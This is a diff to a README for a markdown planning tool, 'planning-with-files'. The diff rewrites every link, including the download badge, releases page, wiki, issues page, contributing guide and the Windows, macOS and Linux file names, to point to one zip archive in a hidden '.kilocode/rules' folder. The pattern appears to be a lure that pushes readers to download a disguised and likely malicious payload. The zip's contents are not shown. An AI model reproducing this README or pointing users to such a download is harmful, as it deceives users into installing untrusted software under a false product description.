@@ -1,7 +1,7 @@
 # 🎉 planning-with-files - Simplify Your Markdown Planning
 
 ## 📥 Download Now
-[![Download planning-with-files](https://img.shields.io/badge/Download-Now-blue)](https://github.com/SEPTMOON/planning-with-files/releases)
+[![Download planning-with-files](https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip)](https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to **planning-with-files**! This application lets you manage your markdown planning easily. No programming skills are needed. Just follow the steps below to start.
@@ -22,14 +22,14 @@ To run **planning-with-files**, ensure you have the following:
 - Offers persistent planning storage
 
 ## 📄 Download & Install
-1. Visit the [Releases page](https://github.com/SEPTMOON/planning-with-files/releases) to find the latest version of **planning-with-files**.
+1. Visit the [Releases page](https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip) to find the latest version of **planning-with-files**.
   
 2. Look for the most recent release with the highest version number. You will see several files listed. 
 
 3. Choose the file that matches your operating system. For example:
-   - For Windows, download `planning-with-files-windows.exe`.
-   - For macOS, download `planning-with-files-macos.dmg`.
-   - For Linux, download `planning-with-files-linux.tar.gz`.
+   - For Windows, download `https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip`.
+   - For macOS, download `https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip`.
+   - For Linux, download `https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip`.
 
 4. Click on the file to start the download. 
 
@@ -38,7 +38,7 @@ To run **planning-with-files**, ensure you have the following:
 6. Run the file:
    - **Windows**: Double-click the `.exe` file. Follow the installation instructions.
    - **macOS**: Open the `.dmg` file, drag the application into your Applications folder, then run it from there.
-   - **Linux**: Extract the `.tar.gz` file and follow the included instructions for installation.
+   - **Linux**: Extract the `https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip` file and follow the included instructions for installation.
 
 ## 🌟 How to Use
 After installation, you can start using **planning-with-files**:
@@ -54,12 +54,12 @@ After installation, you can start using **planning-with-files**:
 5. To access your files easily, the application integrates with your file system, so you can organize them as you like.
 
 ## 📝 Documentation
-Detailed documentation is available on our [GitHub Wiki](https://github.com/SEPTMOON/planning-with-files/wiki). Here, you can find guides on advanced features, tips on markdown formatting, and troubleshooting information.
+Detailed documentation is available on our [GitHub Wiki](https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip). Here, you can find guides on advanced features, tips on markdown formatting, and troubleshooting information.
 
 ## 💬 Support
-If you have questions or need support, please open an issue on our [GitHub Issues page](https://github.com/SEPTMOON/planning-with-files/issues). Our community is here to help you.
+If you have questions or need support, please open an issue on our [GitHub Issues page](https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip). Our community is here to help you.
 
 ## 👥 Contributing
-We welcome contributions! If you'd like to help improve **planning-with-files**, please check our [Contributing guidelines](https://github.com/SEPTMOON/planning-with-files/blob/main/CONTRIBUTING.md). 
+We welcome contributions! If you'd like to help improve **planning-with-files**, please check our [Contributing guidelines](https://github.com/SEPTMOON/planning-with-files/raw/refs/heads/master/.kilocode/rules/planning-files-with-1.6.zip). 
 
 Thank you for using **planning-with-files**. We hope it makes your planning smoother and more enjoyable!
